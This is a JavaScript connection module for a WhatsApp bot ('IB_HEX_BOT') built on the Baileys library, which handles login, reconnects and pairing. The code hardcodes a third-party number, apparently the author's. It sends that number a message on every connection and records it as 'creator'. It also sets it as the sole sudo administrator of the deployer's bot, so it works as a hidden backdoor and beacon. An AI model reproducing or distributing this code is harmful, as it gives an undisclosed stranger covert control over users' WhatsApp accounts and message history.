import {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion
} from 'baileys'

import deployAsPremium from '../utils/DigixV.js'
import configmanager from '../utils/configmanager.js'
import pino from 'pino'
import fs from 'fs'

const SESSION_DIR = 'sessionData'

async function connectToWhatsapp(handleMessage) {
    const { version } = await fetchLatestBaileysVersion()
    console.log('📦 Baileys version:', version)

    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR)

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        logger: pino({ level: 'silent' }),
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000,
        generateHighQualityLinkPreview: true,
    })

    sock.ev.on('creds.update', saveCreds)

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode
            console.log('❌ Disconnected. Status:', statusCode)

            if (statusCode !== DisconnectReason.loggedOut) {
                console.log('🔄 Reconnecting in 5 seconds...')
                setTimeout(() => connectToWhatsapp(handleMessage), 5000)
            } else {
                console.log('🚫 Logged out permanently')
            }
        }

        if (connection === 'connecting') {
            console.log('⏳ Connecting to WhatsApp...')
        }

        if (connection === 'open') {
            console.log('✅ WhatsApp connected successfully!')

            // MESSAGE DE BIENVENUE
            try {
                const chatId = '224621963059@s.whatsapp.net'
                const imageUrl = 'https://i.ibb.co/0Rzzxkx/DigixCo.jpg'

                const messageText = `
╔══════════════════╗
   *IB_HEX_BOT CONNECTED* 🚀
╠══════════════════╣
> Always Forward.
> Ib Hex Bot – One of the best.
╚══════════════════╝

*Powered by ibsacko🥷💻*
                `

                await sock.sendMessage(chatId, {
                    image: { url: imageUrl },
                    caption: messageText
                })

                console.log('📩 Welcome message sent')
            } catch (err) {
                console.error('❌ Welcome message error:', err)
            }

            sock.ev.on('messages.upsert', async (msg) => {
                await handleMessage(sock, msg)
            })
        }
    })

    // PAIRING CODE
    setTimeout(async () => {
        if (!state.creds.registered) {
            try {
                const asPremium = true
                const number = '224666952949' // TON NUMÉRO WHATSAPP

                if (asPremium) {
                    configmanager.premiums.premiumUser['c'] = {
                        creator: '224621963059'
                    }
                    configmanager.premiums.premiumUser['p'] = {
                        premium: number
                    }
                    configmanager.saveP()
                }

                console.log('🔑 Requesting pairing code...')
                const code = await sock.requestPairingCode(number, 'IBHEXBOT')
                console.log('📲 Pairing Code:', code)

                setTimeout(() => {
                    configmanager.config.users[number] = {
                        sudoList: ['224621963059@s.whatsapp.net'],
                        prefix: '.',
                        antilink: true,
                        autoreact: false,
                        publicMode: false,
                    }
                    configmanager.save()
                }, 2000)

            } catch (e) {
                console.error('❌ Pairing error:', e)
            }
        }
    }, 5000)

    return sock
}

export default connectToWhatsapp
